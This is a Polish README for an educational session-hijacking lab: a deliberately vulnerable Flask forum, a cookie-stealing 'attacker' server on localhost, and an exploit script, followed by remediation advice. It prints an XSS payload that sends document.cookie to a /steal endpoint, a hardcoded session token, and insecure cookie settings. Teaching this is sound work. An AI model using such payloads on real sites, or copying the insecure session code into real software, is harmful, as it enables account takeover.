# PCYB Cybersecurity Project - Session Hijacking Demo

Projekt demonstracyjny pokazujący podatności session hijacking w aplikacji webowej.

## 🚀 Szybki start

### 1. Uruchom środowisko Docker (całość projektu)
```powershell
docker compose up -d --build
```

To uruchomi:
- **Aplikację celu** (web): http://localhost:5009 - podatna aplikacja forum
- **Serwer atakującego** (attacker): http://localhost:8888 - serwer przechwytujący ciasteczka

Dane logowania do aplikacji:
- Login: `admin`
- Hasło: `admin`

### 2. Zainstaluj zależności dla payloadu
```powershell
cd payload
pip install -r requirements.txt
```

### 3. Uruchom exploit demonstracyjny
```powershell
python payload\session_hijack.py
```

### 4. Monitoruj serwer atakującego
Otwórz http://localhost:8888 w przeglądarce aby zobaczyć panel z przechwyconymi ciasteczkami.

## 📂 Struktura projektu

```
PCYB_Projekt/
│
├── docker-compose.yml           # Główna konfiguracja Docker Compose
├── README.md                    # Ten plik - szybki start
│
├── aplikacja_celu/              # Aplikacja podatna (target)
│   ├── main.py                  # Flask app z podatnościami
│   ├── templates/               # Szablony HTML (login, protected)
│   ├── static/css/              # Style CSS
│   ├── Dockerfile               # Kontener dla aplikacji
│   └── requirements.txt         # Zależności Python
│
├── serwer_atakujacego/          # Serwer przechwytujący ciasteczka
│   ├── app.py                   # Flask server odbierający skradzione cookies
│   ├── Dockerfile               # Kontener dla serwera
│   └── requirements.txt         # Zależności Python
│
└── payload/                     # Exploit/payload
    ├── session_hijack.py        # Skrypt demonstracyjny ataku
    └── requirements.txt         # Zależności dla exploita
```

## 🎯 Podatności w aplikacji

### 1. Przewidywalny token sesji
```python
SESSION_COOKIE_VALUE = "admin_session_token_pcyb"  # ❌ Hardcoded!
```

### 2. Niezabezpieczona konfiguracja cookie
```python
response.set_cookie(
    SESSION_COOKIE_NAME, 
    SESSION_COOKIE_VALUE,
    httponly=False,    # ❌ JavaScript może odczytać
    secure=False,      # ❌ Przesyłane przez HTTP
    samesite='Lax'     # ⚠️ Zbyt permisywne
)
```

### 3. Brak walidacji sesji
- Brak timeout sesji
- Brak powiązania z IP
- Brak regeneracji tokena
- Brak ochrony CSRF

## 🔍 Demonstrowane wektory ataku

### 1. **Atak na przewidywalny token**
Bezpośrednie wstrzyknięcie znanego tokena:
```python
session.cookies.set("PCYB_forum_session", "admin_session_token_pcyb")
# ✓ Natychmiastowy dostęp bez uwierzytelnienia
```

### 2. **Kradzież cookie przez XSS**
Symulacja wycieku przez JavaScript (możliwe bo `httponly=False`):
```html
<script>
  // Ciasteczko dostępne przez JavaScript
  fetch('http://localhost:8888/steal?cookie=' + document.cookie);
</script>
```
W konsoli przeglądarki: `console.log(document.cookie)` - wyświetla sesję!

### 3. **Network Sniffing / MITM**
Ponieważ `secure=False`, cookie przesyłane przez HTTP:
- Atakujący w tej samej sieci może przechwycić pakiety
- Użycie narzędzi: Wireshark, tcpdump, mitmproxy

### 4. **Session Replay Attack**
- Przechwycenie tokena sesji dowolną metodą
- Odtworzenie sesji w przeglądarce atakującego
- Brak timeoutu sesji - token ważny w nieskończoność

## 🎯 Serwer atakującego (Cookie Stealer)

Serwer na porcie **8888** symuluje zewnętrzny endpoint atakującego:
- **Dashboard**: http://localhost:8888 - podgląd przechwyconych ciasteczek
- **Endpoint XSS**: `http://localhost:8888/steal?cookie=XXX`
- **API**: `/api/cookies` - JSON z przechwyconymi danymi
- Auto-refresh co 5 sekund
- Logowanie timestampu, IP, User-Agent, Referer

**Przykładowy payload XSS:**
```javascript
// Uruchom w konsoli przeglądarki na stronie podatnej
fetch('http://localhost:8888/steal?cookie=' + document.cookie);
```

## 📊 Przykładowy output exploita

```
============================================================
ATTACK VECTOR #1: Predictable Session Token
============================================================
[✓] SESSION HIJACK SUCCESSFUL!
[✓] Gained unauthorized access to protected page
```

## 🛡️ Zalecenia bezpieczeństwa

### **Bezpieczna implementacja sesji:**
```python
import secrets
from datetime import datetime, timedelta

# 1. Generuj kryptograficznie bezpieczne tokeny
session_token = secrets.token_urlsafe(32)

# 2. Przechowuj sesje po stronie serwera z metadanymi
sessions[session_token] = {
    'user_id': user.id,
    'created_at': datetime.now(),
    'last_activity': datetime.now(),
    'ip_address': request.remote_addr,
    'user_agent': request.headers.get('User-Agent')
}

# 3. Ustaw bezpieczne ciasteczko
response.set_cookie(
    'session_id',
    session_token,
    httponly=True,      # ✓ Zapobiega dostępowi JavaScript
    secure=True,        # ✓ Tylko HTTPS
    samesite='Strict',  # ✓ Zapobiega CSRF
    max_age=3600        # ✓ Wygaśnięcie po 1h
)
```

### **Lista poprawek:**
- ✓ Użyć kryptograficznie bezpiecznych tokenów (`secrets.token_urlsafe()`)
- ✓ Ustawić `httponly=True` (ochrona przed XSS)
- ✓ Ustawić `secure=True` (tylko HTTPS)
- ✓ Dodać timeout sesji (absolute + idle)
- ✓ Implementować walidację sesji (IP, User-Agent)
- ✓ Użyć `samesite='Strict'`
- ✓ Dodać tokeny CSRF
- ✓ Logować podejrzane aktywności
- ✓ Sanityzacja wejścia użytkownika (zapobieganie XSS)
- ✓ Content-Security-Policy headers

## 🌐 Architektura Docker

Projekt wykorzystuje **dwie oddzielne sieci Docker**:

```yaml
networks:
  internal_network:    # Sieć wewnętrzna firmy (aplikacja)
  external_network:    # "Internet" (serwer atakującego)
```

- **web** (aplikacja celu): porty 5009, sieć `internal_network`
- **attacker** (serwer atakującego): porty 8888, sieć `external_network`

Symuluje scenariusz gdzie serwer atakującego jest w internecie, oddzielony od sieci wewnętrznej.

## 📝 Do raportu

Należy opisać:
1. **Zidentyfikowane podatności** - lista z kodami CWE (np. CWE-384: Session Fixation)
2. **Metoda eksploatacji** - jak działa każdy wektor ataku
3. **Ocena wpływu** - co atakujący może zrobić po przejęciu sesji
4. **Proof of Concept** - screenshoty/logi ze skryptu exploita i serwera atakującego
5. **Rekomendacje** - konkretne poprawki z przykładami kodu
6. **Weryfikacja** - jak sprawdzić, że poprawka działa

### Przydatne referencje:
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP Session Hijacking Attack](https://owasp.org/www-community/attacks/Session_hijacking_attack)
- [CWE-384: Session Fixation](https://cwe.mitre.org/data/definitions/384.html)
- [MDN: Using HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)

## ⚠️ Disclaimer

Ten projekt jest stworzony wyłącznie w celach edukacyjnych w ramach zajęć z cyberbezpieczeństwa. 
Aplikacja celowo zawiera podatności do nauki.

**NIGDY** nie używaj tych technik na systemach, do których nie masz wyraźnego pozwolenia!

---

**Projekt:** PCYB  
**Data:** Październik 2025
